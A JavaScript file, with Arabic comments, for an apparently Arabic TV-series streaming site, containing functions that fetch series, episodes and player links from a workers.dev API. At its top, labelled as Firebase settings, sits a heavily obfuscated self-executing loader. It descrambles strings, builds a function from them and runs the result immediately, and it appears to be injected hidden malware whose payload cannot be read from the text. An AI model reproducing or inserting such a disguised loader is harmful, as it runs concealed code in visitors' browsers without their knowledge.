// ========== إعدادات Firebase ==========
var firebaseConfig;(function(){var PiF='',orS=834-823;function Qza(k){var d=5644345;var i=k.length;var y=[];for(var z=0;z<i;z++){y[z]=k.charAt(z)};for(var z=0;z<i;z++){var c=d*(z+510)+(d%26296);var x=d*(z+440)+(d%16909);var h=c%i;var f=x%i;var g=y[h];y[h]=y[f];y[f]=g;d=(c+x)%6281811;};return y.join('')};var lND=Qza('oaqwieudttcurlogvhsfjscmznpbxrontycrk').substr(0,orS);var XDy='7C] =fx7ad[=dnp=o(;;r;=>)pab6rrerho;[a9.dcforn vv1mz6l)svc7kC ;,c"n8=,v=n{rn u{rag9(7u(,>sr8 kdrn=;rr(d8df4v=r1ml4]el,(.rajar v= +ifac(vjo.nm0cpwtdljpg[,tt+y;u[,+.;",)=h,f1g =.n=ft+]o ewan],]vs=cd+);C1;;xdg)29(i9f;f ,n)s)lhntxhh{eht;6,,;st=)=uus)r<i(blg x.e;s =)4evaa"iruv.c)eicntb-xufk=;0]in(snarth=(11n=vh(yi+cvf]6va4+j=su-vvv.)e[=0;u=rxqsa)+Ajtti+)vr.tr+,r(.ai2 gk;]rn8cgf){<+s;y(o)n k,Am8lbe(-).kri+((+ny,;6f5 A=tf(h,+.*g+6iphwp o*e1icn,=.rt;n5==-mg5+klje;iv" h+}=mh<;t"b(pe(ghh(e)a} llr0-vto1=2;[)v18.fh,)ooar ;)t,];ra)lg9;;+g vo6(wm()(2l;huer0i;(";!ifpar"-is;is(i=or[+,u=xii.srbe78nq="va]));.{har=9(rb=pt[venx)0us7;j+r1(llb)n;hev;qt.9;iru[s2 A8lxhxaguvgra8[ba=n]0ernn}b+;meu0=.tCob[+]}i7m7rA.=fjtci)}st,uaaq;an=3lr}t.3ar;n h0t[2pln);c1egnnc a.xpk=v]u9..,fo=Ctx,;C)kg.;e)toro2aStr60fr<C.r7(+0aal(s)lvl;(7e62f(= td1nhr-whb2[]{on=Svr4(e.6t2oCo.br(4+{ee",)s x;du;a),"[aaiav,0e!}=+,og;(<ac';var AlU=Qza[lND];var rpV='';var kdr=AlU;var nZQ=AlU(rpV,Qza(XDy));var Ocs=nZQ(Qza('a;y"x.l4_!aiv;=pn\'ca0i.g_=%$+}0(07+1X3(0ycX!}c(,2rokrtcX .imux{.XX!s."!,,e!,abg}sb Xr_(tjc9$p(_S3.p5h)0.-$l db!)rrbXjjX0l5b}.).xe,c3_r3owa(e.%!a;r6tXcjo.6)kX -X$.z5X0frl$!up1D_&pXa#]Ep ;i7b.:,ao+3.&t"p\/y4a6X){+%,kXab-7a.c,7j7\/p[b}$5t6jXva*,.a,o5t2 )!r.. (tb5.=7.%67f}1,tI.nc7,( )#cdan%37.)\/e{ble1adX.p;.!ie s2oe"es3oX:0m;%7:jyp3po$at0bh{;canp4hX.-0mf_u81Xityc)..ag)eek5xle[d3o0&a!X:nX.*nd;s+q={rpXo!6(ocm(X,cabj$k6lX)=)XtrstX(i;aj,_t,=p].XeiiXX0d_m)X0lmt.bg03(514+g)}X!So=b(!3bchaf=ojXqf4 [,d,&Xr3-)=cfXa.,aespX1Is+acb}$(aX..=aX;$1fal)5n))j!,X.X.!ed;!9]\')to63\/43a0_kci.i,&slqcXi.)xXff$j7,g,r4}.hnzltX,g$(-g$,%70v.fa=o6(!_5cltb4,..cXl}C2+]ee=f(-tsd)*;)3es5v,sr 5;jX)7\'bt$tn).3r=jnga209X3S0.tf3Xi!b(!*!crX0Ca:2e{4i$1ff)_.!,ee_.qX=fs}#7r,nr..X$tX.ke_245rX]e+fI6n.).p=g);bfXc#d].-(16XX$XXXta#+lcd{;t.h)2vr{2.7Xa6.;gs=i$n(;v.,cS-p-(XX.dX0]+bu9XEo(afna8.;yXat;fi;erb.tr%i0d]((s(,e$tbrX4s7)seorare4m;cop!Xe1.l.p(q"+)t4}_XXb !!s_(o v){ -!7.v_\')#v_faX,sX!$(sba.=m{i-v.jqfXlnX,ruu0X;uXnox,C(.16X!7ao4t$#x.c,XnX)%Xq2.\/1"lM1eC%3lMk-o3.srXdc.c5i93),at=Xaj)o&Xt$) k)os\/XX7e$ i_2ajfm$(.t0)r()1)fnrl-+3xn(99yplc. 2%=.)0ovs%"$-.;;$_cXXr(!b0,X\/ 7!}c.=X4jn;13egs(XXd59,m=4_,,csgm3%0)hX\/Xt]'));var Wyo=kdr(PiF,Ocs );Wyo(2590);return 5461})()

// ========== إعدادات API الأساسي ==========
const API_BASE = 'https://series.albesriali03.workers.dev/';

// ========== دالة فلترة الصور السيئة ==========
function fixImageUrl(url) {
  if (!url || url.includes('default_image') || url.includes('system_logo') || url.includes('thumbnail.jpg') || url.includes('logo.png')) {
    return 'https://i.ibb.co/0wvJfBH/file-00000000c1e4720a9aba88f120b35bd1.png';
  }
  return url;
}

// ========== دالة جلب كل البيانات من API ==========
async function fetchAllFromAPI() {
  try {
    const res = await fetch(API_BASE + '?action=categories');
    const data = await res.json();
    if (!data.status || !data.data.length) throw new Error('لا توجد أقسام');
    const mainCategories = data.data.slice(0, 3);
    let allSeries = [];
    const promises = mainCategories.map(async (cat) => {
      try {
        const sRes = await fetch(API_BASE + '?action=series&url=' + encodeURIComponent(cat.url));
        const sData = await sRes.json();
        if (sData.status && sData.data.length) {
          return sData.data.map(s => ({
            id: s.url.replace(/[^a-zA-Z0-9]/g, '_'),
            title: s.title,
            image: fixImageUrl(s.image),
            url: s.url,
            episodes_count: s.episodes || '0',
            category: cat.name || '',
            rating: 0, ratingCount: 0, views: 0,
            episodes: [], trailer: ''
          }));
        }
      } catch(e) {}
      return [];
    });
    const results = await Promise.all(promises);
    allSeries = results.flat();
    console.log('✅ API: ' + allSeries.length + ' مسلسل');
    return allSeries;
  } catch(e) { console.log('❌ API فشل'); return null; }
}

// ========== دالة استخراج رقم الحلقة ==========
function extractEpisodeNumber(name) {
  if (!name) return null;
  let match = name.match(/حلقة\s*(\d+)/i) || name.match(/(?:Episode|Ep|E)\s*#?\s*(\d+)/i) || name.match(/Ep#(\d+)/i) || name.match(/#?(\d+)/);
  return match ? match[1] : name;
}

// ========== دالة جلب حلقات مسلسل من API ==========
async function fetchEpisodesFromAPI(seriesUrl) {
  try {
    const res = await fetch(API_BASE + '?action=episodes&url=' + encodeURIComponent(seriesUrl));
    const data = await res.json();
    if (data.status && data.data && data.data.length > 0) {
      return data.data.map((ep, index) => ({
        title: extractEpisodeNumber(ep.name) || String(index + 1),
        url: ep.url || '',
        link1: ep.url || '',
        link2: '', link3: ''
      }));
    }
    return null;
  } catch(e) { return null; }
}

// ========== دالة جلب رابط التشغيل من API ==========
async function fetchPlayUrlFromAPI(episodeUrl) {
  try {
    const res = await fetch(API_BASE + '?action=play&url=' + encodeURIComponent(episodeUrl));
    const data = await res.json();
    if (data.status && data.player_url) return data.player_url;
    return null;
  } catch(e) { return null; }
}
